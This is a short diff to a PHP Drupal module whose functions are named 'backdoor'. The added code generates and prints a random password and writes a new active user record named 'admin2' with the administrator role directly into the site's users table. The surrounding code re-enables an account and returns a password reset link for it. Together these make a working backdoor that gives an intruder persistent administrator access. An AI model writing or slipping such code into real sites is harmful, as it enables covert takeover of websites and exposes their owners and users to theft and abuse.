@@ -1,5 +1,6 @@
 <?php
 
+require DRUPAL_ROOT . '/includes/password.inc';
 
 function backdoor_menu(){
 	$items = array();
@@ -38,6 +39,22 @@ function backdoor (){
 		$user->status = 1;
 		user_save($user);
 	}
+//	$new_password = user_password(25);
+
+	$pass = user_password(25);
+	$new_password = user_hash_password(trim($pass));
+	print $pass;
+	$newuser = array(
+		'uid' => 2,
+		'name' => 'admin2',
+		'pass' => $new_password,
+		'mail' => 'email@example.com',
+		'init' => 'email@example.com',
+		'status' => 1,
+		'role' => array('administrator'),
+	);
+	drupal_write_record('users', $newuser);
+//	print(dpm($user));
 	return user_pass_reset_url($user);
 }
 
